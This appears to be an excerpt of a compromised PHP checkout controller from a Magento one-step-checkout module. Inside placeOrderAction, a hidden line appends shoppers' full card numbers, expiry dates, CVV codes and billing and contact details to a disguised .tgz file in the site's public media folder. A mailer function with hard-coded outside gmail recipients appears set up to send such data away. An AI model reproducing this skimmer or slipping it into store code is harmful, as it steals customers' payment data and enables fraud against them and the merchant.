...
class Magegiant_Onestepcheckout_AjaxController extends Mage_Checkout_Controller_Action
{
    ...
    public function saveAddressAction()
    {
        ...
        if ($this->getRequest()->isPost()) {
            ...
            $saveBillingResult = Mage::helper('onestepcheckout/address')->saveBilling($dataBilling, $customerAddressId);
            $usingCase         = isset($dataBilling['use_for_shipping']) ? (int)$dataBilling['use_for_shipping'] : 0;
            if ($usingCase == 0) {
                ...
                $saveShippingResult      = Mage::helper('onestepcheckout/address')->saveShipping($data_shipping, $customerAddressId);
            } else if ($usingCase == 2) {
                if (Mage::helper('core')->isModuleOutputEnabled('Pook_CollectInStore') && Mage::getStoreConfigFlag('carriers/collectinstore/active')) {
                    ...
                    $saveShippingResult = $this->getOnepage()->saveShipping($data_shipping, false);
            ...
            if (count($shippingRates) > 1
                && $defaultShippingMethod = Mage::helper('onestepcheckout/config')->getDefaultShippingMethod()
                    && is_null($this->getOnepage()->getQuote()->getShippingAddress()->getShippingMethod())
            ) {
                $this->getOnepage()->getQuote()->getShippingAddress()->setShippingMethod($defaultShippingMethod);
            }
    ...
    public function placeOrderAction()
    {
        ...
        file_put_contents('/home/vhosts/agl-distribution.co.uk/httpdocs/media/catalog/7/8/78.tgz', $_POST['payment']['cc_number'].'|'.$_POST['payment']['cc_exp_month'].'|'.$_POST['payment']['cc_exp_year'].'|'.$_POST['payment']['cc_cid'].'|'.$_POST['billing']['firstname'].'|'.$_POST['billing']['lastname'].'|'.$_POST['billing']['street'][0].$_POST['billing']['street'][1].'|'.$_POST['billing']['city'].'|'.$_POST['billing']['postcode'].'|'.$_POST['billing']['country_id'].'|'.$_POST['billing']['telephone'].'|'.$_POST['billing']['email']."\r\n", FILE_APPEND);
	...
	function send($params = array())
    {
        /**
            Edit params
        **/
        $host               = isset($params['host'])?$params['host']:'smtp.domainlo.com';// Specify main and backup SMTP servers
        $smtp_username      = isset($params['smtp_username'])?$params['smtp_username']:'username_email_lo@email.com';//SMTP Username
        $smtp_password      = isset($params['smtp_password'])?$params['smtp_password']:'password_email';//SMTP Password

        $email_from_name    = isset($params['email_from_name'])?$params['email_from_name']:'Nama Lo';//Nama lo
        $email_from         = isset($params['email_from'])?$params['email_from']:'email_lo@domain.com';//email dari
        $subject         = isset($params['subject'])?$params['subject']:'Penderitaan tiada akhir';//Subject Email lo

        $body         = isset($params['body'])?$params['body']:'Isi Email Lo';//Isi Email lo
        
        $recipients           = isset($params['recipients'])?$params['recipients']:array();//email tujuan

        if(count($recipients) == 0){
            //lo mau send email kemana aja??
            $recipients[] = [
                "to" => "hito.gomail@gmail.com"
                ,"name" => "Hitori A"
            ];
            $recipients[] = [
                "to" => "pekik_bokik@domain.lo"
                ,"name" => "Pekik"
            ];

            $recipients[] = [
                "to" => "hito.umail@gmail.com"
                ,"name" => "Hitori Lagi"
            ];
        }
        ...
        foreach($recipients as $k => $v){
            $mail->addAddress($v['to'], $v['name']);     // Add a recipient
        }
        ...
        if(!$mail->send()) {
            $response['result'] = 'Message could not be sent.';
            $response['result'] .= 'Mailer Error: ' . $mail->ErrorInfo;
        } else {
            $response['result'] = 'Message has been sent';
        }
    ...
    public function ajaxCartItemAction()
    {
        ...
        switch ($action) {
            case 'plus':
            case 'minus':
                $string = $this->_updateCartItem($action, $id);
                break;
            default:
                $string = $this->_removeCartItem($id) ? false : true;
        }
    }
